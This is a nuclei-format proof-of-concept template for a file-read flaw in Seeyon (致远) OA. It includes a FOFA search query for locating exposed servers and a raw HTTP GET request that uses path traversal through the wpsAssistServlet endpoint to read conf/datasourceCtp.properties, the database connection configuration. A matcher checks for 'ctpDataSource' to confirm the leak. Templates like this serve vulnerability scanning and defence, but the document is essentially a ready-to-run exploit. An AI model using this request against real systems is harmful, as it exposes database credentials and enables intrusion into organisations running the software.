content:
# Add your nuclei formatted PoC!
id: seeyon-wpsAssistServlet-fileread

info:
  name: 致远OA-wpsAssistServlet-文件读取
  author: 蜜汁狗蛋
  severity: high
  metadata:
    fofa-query: app="致远互联-OA" || body="/seeyon/common/" || body="seeyonDownLoadPic" || body="/yyoa/" || body="/yyoa/seeyonoa/common/"


requests:
  - raw:
      - |
        GET /seeyon/wpsAssistServlet?flag=open&fileId=-1233531&fileType=/../../conf/datasourceCtp.properties HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
        Connection: close
        Accept: */*
        Accept-Encoding: gzip
        Accept-Language: en

        



    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains(body,"ctpDataSource")
author: 蜜汁狗蛋
